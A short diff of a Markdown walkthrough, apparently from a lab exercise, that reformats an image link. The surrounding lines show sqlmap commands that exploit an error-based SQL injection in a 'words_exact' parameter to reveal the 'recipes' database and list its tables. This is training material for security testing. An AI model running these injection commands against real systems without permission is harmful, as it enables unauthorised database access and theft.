@@ -53,7 +53,8 @@
     - > __E= Error based, U= UNION base, B= BOOLEAN base__
 - __`sqlmap -r request -p words_exact --technique=E --current-db`__
   - __To get the database name here it is `recipes`__
-![image3](Image/sqlmap2.png)
+  
+  ![image3](Image/sqlmap2.png)
 
 - __If you know the Database name use the below command__
 - __`sqlmap -r request -p words_exact --technique=E -D recipes --tables`__
